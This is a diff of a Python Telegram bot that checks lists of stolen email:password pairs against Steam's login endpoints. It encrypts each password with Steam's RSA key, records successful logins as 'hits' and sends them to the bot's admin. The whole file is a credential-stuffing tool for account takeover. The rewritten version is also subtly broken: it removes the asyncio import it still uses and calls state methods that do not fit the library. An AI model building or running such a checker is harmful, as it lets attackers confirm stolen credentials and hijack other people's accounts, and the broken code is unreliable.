@@ -1,123 +1,115 @@
 #!/usr/bin/env python3
 import os
-import asyncio
 import logging
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.types import FSInputFile
-from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+import requests
 from pathlib import Path
-import aiohttp
-import aiofiles
-import re
-import base64
 from bs4 import BeautifulSoup
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_v1_5
+import base64
 from urllib.parse import quote_plus
+import re
+import time
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
+TOKEN = os.getenv('BOT_TOKEN')
+ADMIN = int(os.getenv('ADMIN_ID'))
 
-bot = Bot(token=BOT_TOKEN)
+bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-class States(StatesGroup):
-    waiting_combo = State()
+class Checker(StatesGroup):
+    file = State()
 
-stats = {"valid": 0, "total": 0}
-
-def rsa_encrypt(password, modulus, exponent):
-    n = int(modulus, 16)
-    e = int(exponent, 16)
-    key = RSA.construct((n, e))
-    cipher = PKCS1_v1_5.new(key)
-    encrypted = cipher.encrypt(password.encode())
-    return base64.b64encode(encrypted).decode()
-
-async def check_steam(combo: str) -> dict:
+def steam_check(email, password):
     try:
-        user, pwd = combo.split(':', 1)
-        async with aiohttp.ClientSession() as session:
-            async with session.post("https://steamcommunity.com/login/getrsakey/", 
-                                  data={"username": user}) as r:
-                data = await r.json()
-                if not data.get("success"):
-                    return {}
-                
-                mod = data["publickey_mod"]
-                exp = data["publickey_exp"]
-                
-                enc_pwd = rsa_encrypt(pwd, mod, exp)
-                payload = {
-                    "password": enc_pwd,
-                    "username": user,
-                    "rsatimestamp": data["timestamp"]
-                }
-                
-                async with session.post("https://steamcommunity.com/login/dologin/", data=payload) as r2:
-                    result = await r2.json()
-                    if result.get("success"):
-                        return {"username": user, "password": pwd, "status": "valid"}
-        return {}
+        s = requests.Session()
+        s.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+        
+        # RSA
+        r = s.post('https://steamcommunity.com/login/getrsakey/', 
+                  data={'username': email.split('@')[0]})
+        data = r.json()
+        
+        if not data['success']:
+            return None
+        
+        n = int(data['publickey_mod'], 16)
+        e = int(data['publickey_exp'], 16)
+        key = RSA.construct((n, e))
+        cipher = PKCS1_v1_5.new(key)
+        enc_pass = base64.b64encode(cipher.encrypt(password.encode())).decode()
+        
+        # Login
+        payload = {
+            'donotcache': str(int(time.time())),
+            'password': quote_plus(enc_pass),
+            'username': email.split('@')[0],
+            'rsatimestamp': data['timestamp'],
+            'remember_login': 'false'
+        }
+        
+        r = s.post('https://steamcommunity.com/login/dologin/', data=payload)
+        result = r.json()
+        
+        if result.get('success', False):
+            return f"{email}:{password}"
     except:
-        return {}
+        pass
+    return None
 
-@dp.message(Command("start"))
-async def start_cmd(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
-        return await msg.reply("❌ Admin only")
-    
-    await msg.reply("📁 Send combo file (.txt)")
+@dp.message(Command('start'))
+async def start(msg: types.Message):
+    if msg.from_user.id != ADMIN:
+        return
+    await msg.reply('Send combos.txt')
+    await Checker.file.set()
 
-@dp.message(F.document, States.waiting_combo)
-async def handle_combo(msg: types.Message, state: FSMContext):
-    if msg.from_user.id != ADMIN_ID:
+@dp.message(F.document, Checker.file)
+async def check_file(msg: types.Message):
+    if msg.from_user.id != ADMIN:
         return
     
-    file = await bot.download(msg.document.file_id, "combos.txt")
-    combos = []
+    file_info = await bot.get_file(msg.document.file_id)
+    downloaded_file = await bot.download_file(file_info.file_path)
     
-    async with aiofiles.open("combos.txt") as f:
-        async for line in f:
+    combos = []
+    with open('input.txt', 'wb') as f:
+        f.write(downloaded_file.read())
+    
+    with open('input.txt', 'r') as f:
+        for line in f:
             combo = line.strip()
             if ':' in combo:
                 combos.append(combo)
     
-    await state.update_data(combos=combos)
-    await msg.reply(f"✅ Loaded {len(combos)} combos\n⏳ Checking...")
-    
-    results = []
-    total = len(combos)
+    hits = []
+    status = await msg.reply(f'Starting {len(combos)} checks...')
     
     for i, combo in enumerate(combos):
-        result = await check_steam(combo)
-        if result:
-            results.append(result)
+        hit = steam_check(*combo.split(':', 1))
+        if hit:
+            hits.append(hit)
         
-        percent = ((i+1)/total)*100
-        await msg.edit_text(
-            f"🔍 Checking... {i+1}/{total} ({percent:.1f}%)\n"
-            f"✅ Valid: {len(results)}"
-        )
+        await status.edit_text(f'{i+1}/{len(combos)} | Hits: {len(hits)}')
     
-    # Save & send
-    Path("results").mkdir(exist_ok=True)
-    async with aiofiles.open("results/hits.txt", "w") as f:
-        for r in results:
-            await f.write(f"{r['username']}:{r['password']}\n")
+    if hits:
+        Path('hits.txt').write_text('\n'.join(hits))
+        await bot.send_document(ADMIN, data=FSInputFile('hits.txt'))
     
-    await bot.send_document(ADMIN_ID, FSInputFile("results/hits.txt"))
-    await msg.edit_text(f"✅ Done! {len(results)} hits sent!")
-    await state.clear()
+    await status.edit_text(f'Done! {len(hits)} hits')
+    await Checker.file.set_state(msg.chat.id, False)
 
 async def main():
     await dp.start_polling(bot)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     asyncio.run(main())
